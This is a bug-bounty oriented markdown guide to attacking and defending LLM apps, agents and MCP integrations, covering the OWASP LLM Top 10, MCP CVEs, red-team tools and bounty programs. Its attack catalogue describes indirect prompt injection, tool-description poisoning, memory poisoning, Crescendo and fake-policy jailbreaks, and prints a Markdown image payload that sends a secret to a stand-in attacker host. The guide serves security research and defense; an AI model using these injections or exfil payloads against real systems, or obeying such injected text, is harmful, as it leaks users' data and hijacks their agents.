# LLM & Agent Security — 2025/2026

> Current as of **2026-04-15**. Living doc — PR or ping [@kdairatchi](https://github.com/kdairatchi) with anything broken.

The bug bounty landscape shifted. Web2 classes still pay, but the newest, widest-open attack surface in 2025-2026 is **LLM apps + agentic systems + MCP integrations**. This doc is the map.

---

## TL;DR for beginners

- Prompt injection = SQLi for LLMs. Direct = jailbreak. Indirect = payload in a doc/url/tool result the model reads.
- System prompts are **public**. Don't store secrets there.
- Every tool an agent can call is a potential lateral-movement primitive.
- The fastest payday in this space right now: **indirect prompt injection → exfil** in enterprise AI copilots (Notion, Slack, M365, Google Workspace).

## TL;DR for pros

Stop fuzzing jailbreaks for points. Hunt:
1. **Indirect injection with side-effect gadgets** (Markdown image render, URL preview, auto-open link).
2. **MCP tool poisoning** via description-field smuggling.
3. **Cross-tenant RAG contamination** in shared vector stores.
4. **Agent confused-deputy** — agent has broad creds, attacker controls the prompt chain.
5. **Memory persistence** — inject once, fire forever.

---

## OWASP LLM Top 10 — 2025 Edition

Published late 2024, current through 2026. https://genai.owasp.org/llm-top-10/

| # | Class | Hunt signal |
|---|---|---|
| LLM01 | **Prompt Injection** (direct + indirect) | any input reaching the model — docs, emails, tool output, webpage content |
| LLM02 | **Sensitive Info Disclosure** | RAG leaks, embedding inversion, cross-tenant retrieval |
| LLM03 | **Supply Chain** | HuggingFace pickle, typosquatted `langchain` / `llama-index` |
| LLM04 | **Data & Model Poisoning** | RLHF reward hacking, sleeper agents |
| LLM05 | **Improper Output Handling** | LLM output → unsanitized HTML/SQL/shell — classic XSS/SSRF via AI |
| LLM06 | **Excessive Agency** | agents with too many tools / too broad creds |
| LLM07 | **System Prompt Leakage** | treat as public; don't hide secrets in it |
| LLM08 | **Vector & Embedding Weaknesses** | RAG poisoning, shared-DB cross-tenant |
| LLM09 | **Misinformation** → **Slopsquatting** | hallucinated package names registered by attacker (Lasso, Mar 2025) |
| LLM10 | **Unbounded Consumption** | DoS + wallet drain via expensive inference |

---

## MCP — The 2025/2026 Frontier

MCP (Model Context Protocol) went from Anthropic-only in late 2024 to industry standard (OpenAI + Google adopted Q1 2026). Huge attack surface, mostly unreviewed.

**Known CVEs (track these):**

| CVE | CVSS | Impact |
|---|---|---|
| CVE-2025-49596 | 9.4 | MCP Inspector RCE via CSRF (browser→host) |
| CVE-2025-59536 | 8.7 | Claude Code RCE via malicious `.claude/settings.json` in cloned repo |
| CVE-2025-6514 | 9.6 | `mcp-remote` command injection |
| CVE-2025-68143 | — | `mcp-server-git` path traversal |
| CVE-2025-68144 | — | `mcp-server-git` arbitrary file overwrite |
| CVE-2025-68145 | — | `mcp-server-git` symlink path bypass |
| CVE-2026-21852 | 5.3 | Claude Code API key exfil via project-load |
| CVE-2026-35022 | Critical | Claude CLI/SDK OS command injection |

**Attack classes:**

- **Tool Poisoning (TPA)** — Invariant Labs, Apr 2025. Hidden instructions in tool *descriptions* (not just results) hijack the model. Works against Claude Desktop, Cursor, Windsurf.
- **Rug-pull** — MCP server updates its tool definitions post-install, unaudited.
- **Confused deputy** — agent has broad creds; attacker's poisoned input drives the tool calls.
- **Cross-server shadowing** — malicious server overrides a trusted server's tool name.

**Defense stack:**

- **Gateways:** Lasso MCP Gateway, Invariant Guardrails, Pillar Security
- Pin server versions. Audit `.claude/`, `.cursor/`, `.vscode/mcp.json` **before** opening cloned repos
- `CLAUDE_CODE_ENABLE_TELEMETRY=1` + OpenTelemetry collector
- XML trust delimiters in system prompts: `<user_input>...</user_input>`

---

## Attack Catalogue — 2025/2026

### Indirect Prompt Injection (the money shot)

Payload lives in data the model reads — webpage, PDF, email, calendar invite, code comment, image OCR, audio transcription. Greshake et al. is still the canonical methodology.

**Confirmed primitives:**
- **Markdown image exfil** — `![](https://attacker/?data=SECRET)` renders → leak
- **Auto-follow links** — agents with browsing will fetch attacker URLs
- **Tool-call hijack** — poisoned tool result redirects next action

**Real incidents (tracked):**
- **EchoLeak** — CVE-2025-32711, zero-click M365 Copilot exfil, Aim Security, Jun 2025
- **Notion AI** — Sept 2025, shared-page injection rendering attacker Markdown
- **Gemini Workspace** — Mozilla 0Din, calendar-invite injection
- **Slack AI** — cross-channel secret retrieval via @mention injection
- **GitHub Copilot Chat** — README-based exfil
- **Claude Computer Use** — HiddenLayer, on-screen text injection driving agent
- **Replit Agent** — Jul 2025 prod DB wipe (agentic guardrails incident)

### Multi-turn Crescendo

Microsoft Research. 47% breach rate across frontier models by gradually escalating benign → sensitive. arxiv.org/abs/2404.01833. Use **PyRIT** to automate.

### Memory Poisoning

Persistent memory (ChatGPT, Claude Projects) attacked via "remember this" payloads. Rehberger's ChatGPT memory exfil via Markdown image — patched → re-broken Q3 2025.

### Policy Puppetry

HiddenLayer, Apr 2025. Format injection as fake system-policy XML. Bypassed GPT-4o, Claude 3.7, Gemini 2.5.

### DeepSeek R1

Cisco + Robust Intelligence, Jan 2025: 100% attack success on HarmBench. Reasoning traces leak safety intent → jailbreak trivially.

---

## Red Team Toolkit

| Tool | Best for | URL |
|---|---|---|
| **Promptfoo** | Quick OWASP LLM scan, beginner-friendly | https://github.com/promptfoo/promptfoo |
| **Garak** (NVIDIA) | Broad probe sweep — DAN, encoding, glitch tokens | https://github.com/NVIDIA/garak |
| **PyRIT** (Microsoft) | Multi-turn campaigns, Crescendo built-in | https://github.com/Azure/PyRIT |
| **DeepTeam** | Compliance (NIST AI RMF, EU AI Act) | https://github.com/confident-ai/deepteam |
| **Burp AI Auditor** | In-browser injection during pentests | PortSwigger, Q4 2025 |
| **Agentic Radar** | Agent architecture mapping | Splx AI |

Workflow:
1. Promptfoo → triage surface
2. Garak → automated probe pass
3. PyRIT Crescendo → depth where Promptfoo/Garak flag interesting
4. Manual MCP audit on any target shipping AI features

---

## Defense Stack (know both sides)

- **NVIDIA NeMo Guardrails** — programmable rails in Colang
- **Lakera Guard** — ~10ms API-based injection detection
- **Microsoft Prompt Shields** — Azure AI Content Safety
- **Protect AI Rebuff / LLM Guard** — open-source output filters, PII redaction
- **Anthropic Constitutional Classifiers** — 95% jailbreak block (Feb 2025)

---

## Bug Bounty Programs (2026)

Dedicated AI red-team tracks launched in 2025. Private invites pay **$5k–$50k** for novel bypasses.

- **Anthropic** — HackerOne, Claude ecosystem
- **OpenAI** — Bugcrowd + invite-only GPT red team
- **Google DeepMind** — private, via VRP
- **Cohere** — HackerOne
- **Meta** — LLaMA + Meta AI scope on BugBounty

Report quality matters more here than in web2 — include repro prompt, model+version+date, and real impact (data exfil, action, persistence) not "it said bad word."

---

## Further reading

- `../08 - RedTeam/Red Team Playbook - Claude Ecosystem.md` (vault) — full offensive catalog
- `../08 - RedTeam/Blue Team Playbook - Claude Ecosystem.md` (vault) — hardening
- `../Methodology/PurpleAi.md` — purple-team LLM workflow
- `../Latest-2026/` — rolling CVE + technique tracker

---

*Evidence labels:* sourced facts cite CVE/researcher/date. Everything else is inference from that base. Ping me if a date/CVE is wrong — this file rots fast.
